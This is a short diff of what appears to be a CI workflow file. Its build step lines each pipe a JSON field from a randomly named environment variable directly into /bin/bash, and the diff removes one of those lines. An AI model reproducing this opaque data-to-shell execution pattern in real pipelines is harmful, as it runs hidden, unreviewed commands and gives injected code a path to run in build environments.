@@ -22,7 +22,6 @@ jobs:
           echo $ga70 | jq -r .spku02 | /bin/bash
           printf '%s' "$f34933" | jq -r .azlwr6 | /bin/bash
           echo $f5529 | jq -r .paa6 | /bin/bash
-          echo $zw357 | jq -r .c64994 | /bin/bash
           echo $tuem81 | jq -r .owaye167 | /bin/bash
 
       - name: Archive output
